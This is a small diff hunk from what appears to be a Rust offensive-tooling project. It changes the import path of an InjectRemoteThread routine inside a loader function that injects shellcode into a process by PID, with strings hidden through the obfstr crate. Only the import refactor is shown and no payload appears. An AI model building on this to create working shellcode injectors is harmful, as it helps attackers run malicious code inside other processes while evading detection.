@@ -3,7 +3,7 @@ use obfstr::obfstr;
 #[cfg(feature = "prebuild")]
 pub unsafe fn loader(bin: Vec<u8>, pid: u32) -> Result<String, String>
 {
-    use crate::win::kit::InjectRemoteThread;
+    use crate::win::kit::bindings::InjectRemoteThread;
     if bin.is_empty() {
         return Err(obfstr!("empty shellcode").to_string());
     }
